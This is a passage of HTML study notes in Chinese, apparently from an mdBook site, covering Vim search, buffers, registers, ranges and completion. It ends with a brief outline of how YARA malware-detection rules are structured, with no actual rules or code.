<tr><td>在文档中查找下一处匹配项</td><td>/pattern</td><td>n</td><td>N</td></tr>
<tr><td>在文档中查找上一处匹配项</td><td>?pattern</td><td>n</td><td>N</td></tr>
<tr><td>执行替换</td><td><code>:s/target/replacement</code></td><td>&amp;</td><td>u</td></tr>
<tr><td>执行一系列修改</td><td>qx{changes}q</td><td>@x</td><td>u</td></tr>
</tbody></table>
</div>
<h2 id="技巧5"><a class="header" href="#技巧5">技巧5</a></h2>
<p>按<code>*</code>搜索，c是修改</p>
<h1 id="vim-从入门到精通"><a class="header" href="#vim-从入门到精通">Vim 从入门到精通</a></h1>
<p><a href="https://github.com/wsdjeg/vim-galore-zh_cn">网址在这儿</a></p>
<h2 id="vim哲学"><a class="header" href="#vim哲学">vim哲学</a></h2>
<p>减少认识负荷并帮助人们专注于实际任务</p>
<h2 id="缓冲区窗口标签"><a class="header" href="#缓冲区窗口标签">缓冲区，窗口，标签</a></h2>
<p>缓冲区是工作的地方，窗口是缓冲区的视窗，标签是窗口的集合。</p>
<h2 id="已激活已载入已列出已命名的缓冲区"><a class="header" href="#已激活已载入已列出已命名的缓冲区">已激活、已载入、已列出、已命名的缓冲区</a></h2>
<p>用类似 vim file1 的命令启动 Vim 。这个文件的内容将会被加载到缓冲区中，你现在有一个已载入的缓冲区。如果你在 Vim 中保存这个文件，缓冲区内容将会被同步到磁盘上（写回文件中）。</p>
<p>由于这个缓冲区也在一个窗口上显示，所以他也是一个已激活的缓冲区。如果你现在通过 :e file2 命令加载另一个文件，file1 将会变成一个隐藏的缓冲区，并且 file2 变成已激活缓冲区。</p>
<p>使用 :ls 我们能够列出所有可以列出的缓冲区。插件缓冲区和帮助缓冲区通常被标记为不可以列出的缓冲区，因为那并不是你经常需要在编辑器中编辑的常规文件。通过 :ls! 命令可以显示被放入缓冲区列表的和未被放入列表的缓冲区。</p>
<p>未命名的缓冲区是一种没有关联特定文件的缓冲区，这种缓冲区经常被插件使用。比如 :enew 将会创建一个无名临时缓冲区。添加一些文本然后使用 :w /tmp/foo 将他写入到磁盘，这样这个缓冲区就会变成一个已命名的缓冲区。</p>
<h2 id="寄存器"><a class="header" href="#寄存器">寄存器</a></h2>
<div class="table-wrapper"><table><thead><tr><th>类型</th><th>标识</th><th>读写者</th><th>是否为只读</th><th>包含的字符来源</th></tr></thead><tbody>
<tr><td>Unnamed</td><td><code>&quot;</code></td><td>vim</td><td>否</td><td>最近一次的复制或删除操作 (<code>d</code>, <code>c</code>, <code>s</code>, <code>x</code>, <code>y</code>)</td></tr>
<tr><td>Numbered</td><td><code>0</code>至<code>9</code></td><td>vim</td><td>否</td><td>寄存器 <code>0</code>: 最近一次复制。寄存器 <code>1</code>: 最近一次删除。寄存器 <code>2</code>: 倒数第二次删除，以此类推。对于寄存器 <code>1</code> 至 <code>9</code>，他们其实是只读的最多包含 9 个元素的队列。这里的队列即为数据类型 <a href="https://en.wikipedia.org/wiki/Queue_(abstract_data_type)">queue</a></td></tr>
<tr><td>Small delete</td><td><code>-</code></td><td>vim</td><td>否</td><td>最近一次行内删除</td></tr>
<tr><td>Named</td><td><code>a</code>至<code>z</code>, <code>A</code>至<code>Z</code></td><td>用户</td><td>否</td><td>如果你通过复制操作存储文本至寄存器 <code>a</code>，那么 <code>a</code> 中的文本就会被完全覆盖。如果你存储至 <code>A</code>，那么会将文本添加给寄存器 <code>a</code>，不会覆盖之前已有的文本</td></tr>
<tr><td>Read-only</td><td><code>:</code>与<code>.</code>和<code>%</code></td><td>vim</td><td>是</td><td><code>:</code>: 最近一次使用的命令，<code>.</code>: 最近一次添加的文本，<code>%</code>: 当前的文件名</td></tr>
<tr><td>Alternate buffer</td><td><code>#</code></td><td>vim</td><td>否</td><td>大部分情况下，这个寄存器是当前窗口中，上一次访问的缓冲区。请参阅 <code>:h alternate-file</code> 来获取更多帮助</td></tr>
<tr><td>Expression</td><td><code>=</code></td><td>用户</td><td>否</td><td>复制 VimL 代码时，这个寄存器用于存储代码片段的执行结果。比如，在插入模式下复制 <code>&lt;c-r&gt;=5+5&lt;cr&gt;</code>，那么这个寄存器就会存入 10</td></tr>
<tr><td>Selection</td><td><code>+</code>和<code>*</code></td><td>vim</td><td>否</td><td><code>*</code> 和 <code>+</code> 是 <a href="Useful-tools/vim.html#%E5%89%AA%E8%B4%B4%E6%9D%BF">剪贴板</a> 寄存器</td></tr>
<tr><td>Drop</td><td><code>~</code></td><td>vim</td><td>是</td><td>最后一次拖拽添加至 Vim 的文本（需要 “+dnd” 支持，暂时只支持 GTK GUI。请参阅 <code>:help dnd</code> 及 <code>:help quote~</code>）</td></tr>
<tr><td>Black hole</td><td><code>_</code></td><td>vim</td><td>否</td><td>一般称为黑洞寄存器。对于当前操作，如果你不希望在其他寄存器中保留文本，那就在命令前加上 <code>_</code>。比如，<code>&quot;_dd</code> 命令不会将文本放到寄存器 <code>&quot;</code>、<code>1</code>、<code>+</code> 或 <code>*</code> 中</td></tr>
<tr><td>Last search pattern</td><td><code>/</code></td><td>vim</td><td>否</td><td>最近一次通过 <code>/</code>、<code>?</code> 或 <code>:global</code> 等命令调用的匹配条件</td></tr>
<tr><td><strong>十分有用！！！</strong></td><td></td><td></td><td></td><td></td></tr>
</tbody></table>
</div>
<h2 id="范围"><a class="header" href="#范围">范围</a></h2>
<p>熟练使用范围，可以操作得很快</p>
<p>比如逗号分号表示的范围。</p>
<h2 id="补全"><a class="header" href="#补全">补全</a></h2>
<p>ctrl+x</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="yara"><a class="header" href="#yara">yara</a></h1>
<p>yara引擎，是一个规则匹配的工具。</p>
<p>好处在于其可以通过简单的编写规则来识别恶意代码，并且可以在各个平台下使用。</p>
<h1 id="yara规则"><a class="header" href="#yara规则">yara规则</a></h1>
<p><a href="https://yara.readthedocs.io/en/stable/writingrules.html">官方文档</a></p>
<p>Each rule in YARA starts with the keyword rule followed by a rule identifier.</p>
<p>Rules are generally composed of two sections: strings definition and condition. The strings definition section can be omitted if the rule doesn’t rely on any string, but the condition section is always required.</p>
<p>There are three types of strings in YARA: hexadecimal strings, text strings and regular expressions.</p>
<p>Starting with version 4.3.0, you may specify that a byte is not a specific value.</p>
<p>use jumps</p>
<p>regular expression</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>

    </div>
    </body>
</html>
